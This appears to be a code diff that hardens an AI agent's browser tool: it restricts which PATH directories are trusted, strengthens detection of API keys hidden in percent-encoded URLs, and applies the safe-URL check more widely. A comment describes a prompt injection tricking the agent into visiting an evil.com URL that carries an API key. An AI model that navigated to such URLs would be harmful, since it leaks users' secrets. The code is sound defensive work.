@@ -213,15 +213,15 @@ def _blank_browser_after_block(effective_task_id: str) -> None:
     except Exception:
         logger.debug("Failed to blank browser after unsafe eval side effect", exc_info=True)
 # Standard PATH entries for environments with minimal PATH (e.g. systemd services).
-# Includes Android/Termux and macOS Homebrew locations needed for agent-browser,
-# npx, node, and Android's glibc runner (grun).
+# Includes Android/Termux locations needed for agent-browser and Android's
+# glibc runner (grun), plus system directories. User-writable package-manager
+# prefixes such as Homebrew (``/opt/homebrew/{bin,sbin}``,
+# ``/usr/local/{bin,sbin}``) are intentionally not injected when absent from
+# the operator-provided PATH — those are trust roots an operator may have
+# deliberately removed (restricted-PATH launches).
 _SANE_PATH_DIRS = (
     "/data/data/com.termux/files/usr/bin",
     "/data/data/com.termux/files/usr/sbin",
-    "/opt/homebrew/bin",
-    "/opt/homebrew/sbin",
-    "/usr/local/sbin",
-    "/usr/local/bin",
     "/usr/sbin",
     "/usr/bin",
     "/sbin",
@@ -253,20 +253,38 @@ def _discover_homebrew_node_dirs() -> tuple[str, ...]:
     return tuple(dirs)
 
 
-def _browser_candidate_path_dirs() -> list[str]:
-    """Return ordered browser CLI PATH candidates shared by discovery and execution."""
+def _browser_candidate_path_dirs(existing_path: str = "") -> list[str]:
+    """Return safe browser CLI PATH candidates shared by discovery and execution.
+
+    User-writable trust roots (Homebrew prefix, Hermes-managed Node bin) are
+    only added when ``existing_path`` already lists that root. This preserves
+    restricted-PATH launches (cron, systemd, locked-down operator configs)
+    while still letting normal interactive installs find their toolchains.
+    """
+    path_parts = [p for p in (existing_path or "").split(os.pathsep) if p]
+    candidates = list(_SANE_PATH_DIRS)
+
+    if any(p.startswith("/opt/homebrew/") or p == "/opt/homebrew" for p in path_parts):
+        candidates.extend(_discover_homebrew_node_dirs())
+
+    if any(p.startswith("/usr/local/") or p == "/usr/local" for p in path_parts):
+        candidates.extend(("/usr/local/bin", "/usr/local/sbin"))
+
     hermes_home = get_hermes_home()
     hermes_node_bin = str(hermes_home / "node" / "bin")
-    return [hermes_node_bin, *list(_discover_homebrew_node_dirs()), *_SANE_PATH_DIRS]
+    if hermes_node_bin in path_parts:
+        candidates.append(hermes_node_bin)
+
+    return candidates
 
 
 def _merge_browser_path(existing_path: str = "") -> str:
-    """Prepend browser-specific PATH fallbacks without reordering existing entries."""
+    """Prepend safe browser PATH fallbacks without reordering existing entries."""
     path_parts = [p for p in (existing_path or "").split(os.pathsep) if p]
     existing_parts = set(path_parts)
     prefix_parts: list[str] = []
 
-    for part in _browser_candidate_path_dirs():
+    for part in _browser_candidate_path_dirs(existing_path):
         if not part or part in existing_parts or part in prefix_parts:
             continue
         if os.path.isdir(part):
@@ -1779,9 +1797,11 @@ def _find_agent_browser() -> str:
         _agent_browser_resolved = True
         return which_result
 
-    # Build an extended search PATH including Hermes-managed Node, macOS
-    # versioned Homebrew installs, and fallback system dirs like Termux.
-    extended_path = _merge_browser_path("")
+    # Build an extended search PATH from safe fallback dirs plus any toolchain
+    # prefixes the operator already opted into via the process PATH (Homebrew,
+    # Hermes-managed Node, /usr/local). Restricted-PATH launches stay
+    # restricted; normal interactive installs still discover their toolchains.
+    extended_path = _merge_browser_path(os.environ.get("PATH", ""))
     if extended_path:
         which_result = shutil.which("agent-browser", path=extended_path)
         if which_result:
@@ -2272,11 +2292,10 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
     # Secret exfiltration protection — block URLs that embed API keys or
     # tokens in query parameters. A prompt injection could trick the agent
     # into navigating to https://evil.com/steal?key=sk-ant-... to exfil secrets.
-    # Also check URL-decoded form to catch %2D encoding tricks (e.g. sk%2Dant%2D...).
-    import urllib.parse
-    from agent.redact import _PREFIX_RE
-    url_decoded = urllib.parse.unquote(url)
-    if _PREFIX_RE.search(url) or _PREFIX_RE.search(url_decoded):
+    # url_contains_secret applies repeated percent-decoding so double-encoded
+    # tricks (sk%252Dant%252D... → sk-ant-...) are still caught.
+    from agent.redact import url_contains_secret
+    if url_contains_secret(url):
         return json.dumps({
             "success": False,
             "error": "Blocked: URL contains what appears to be an API key or token. "
@@ -2321,8 +2340,7 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
             })
 
     if (
-        not _is_local_backend()
-        and not auto_local_this_nav
+        not auto_local_this_nav
         and not _allow_private_urls()
         and not _is_safe_url(url)
     ):
